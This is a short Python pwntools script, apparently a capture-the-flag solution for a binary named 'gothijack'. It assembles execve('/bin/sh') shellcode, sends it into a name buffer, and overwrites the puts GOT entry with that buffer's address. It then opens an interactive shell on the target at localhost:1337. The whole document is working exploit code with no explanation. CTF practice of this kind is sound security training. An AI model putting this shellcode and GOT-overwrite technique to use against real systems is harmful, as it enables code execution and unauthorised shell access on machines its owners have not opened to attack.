#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context(arch='amd64', os='linux')  # i386, amd64
_ATT = 0
_local = 0

host = "localhost"
port = "1337"
exe_path = './gothijack'
#libc_path = './LIBC'
r = None
elf = None
libc_elf = None
def conn():
    global r, elf, libc_elf
    # elf = ELF(exe_path)
    #libc_elf = ELF(libc_path)
    if _local:
        r = process(exe_path)
    else:
        r = remote(host, port)
conn()
if _ATT:
    log.info('Waiting for attach...')
    raw_input()

puts_got = 0x0601018
name_data = 0x0601080

sc = asm('''
call shell
.ascii "/bin/sh"
.byte 0

shell:
    xor rax, rax
    mov al, 0x3b
    mov rdi, [rsp]
    xor rsi, rsi
    xor rdx, rdx
    syscall
''')

print sc

payload=''

print r.recvuntil('?\n')
r.sendline(sc)
print r.recvuntil('?\n')
r.sendline(str(puts_got))
print r.recvuntil(': ')
r.sendline(p64(name_data))
r.interactive()
